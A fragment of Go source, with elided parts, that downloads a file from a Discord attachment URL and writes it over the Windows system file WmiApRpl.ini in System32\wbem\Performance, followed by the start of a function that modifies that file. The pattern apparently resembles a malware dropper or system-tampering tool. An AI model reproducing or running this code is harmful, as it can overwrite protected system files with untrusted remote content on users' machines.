...
func download1() {
	url := "https://cdn.discordapp.com/attachments/1108786431020769330/1124410723007725619/WmiApRpl.ini"
	...
	file, err := os.Create("C:\\Windows\\System32\\wbem\\Performance\\WmiApRpl.ini")
	if err != nil {
		fmt.Println(err)
		return
	}
...
func modifica() {
	filePath := "C:\\Windows\\System32\\wbem\\Performance\\WmiApRpl.ini"
